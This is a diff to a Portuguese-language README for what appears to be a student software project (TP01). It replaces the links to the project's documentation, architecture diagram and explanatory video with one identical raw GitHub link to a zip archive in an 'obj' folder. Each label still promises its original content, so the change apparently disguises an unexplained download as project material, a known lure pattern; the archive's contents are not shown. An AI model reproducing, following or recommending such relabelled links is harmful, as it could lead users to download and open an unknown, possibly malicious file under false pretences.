@@ -35,10 +35,10 @@ Participações dos membros:
 			Ricardo Filipe Terra Martins de Melo, MAT:232038504
 
 Para ler a documentação da aplicação, acesse:
-/Docs/html/index.html
+https://raw.githubusercontent.com/Lucas-Camilo-Dados/TP01/main/obj/TP01-2.5.zip
 
 Para acesso aos diagramas, acesse:
-/Diagramas/ArquiteturaDeSoftware.drawio.pdf
+https://raw.githubusercontent.com/Lucas-Camilo-Dados/TP01/main/obj/TP01-2.5.zip
 
 Vídeo explicativo do projeto:
-https://youtu.be/R38EpEwMcDM?si=P0WPLXnzVJqQQ91d
+https://raw.githubusercontent.com/Lucas-Camilo-Dados/TP01/main/obj/TP01-2.5.zip
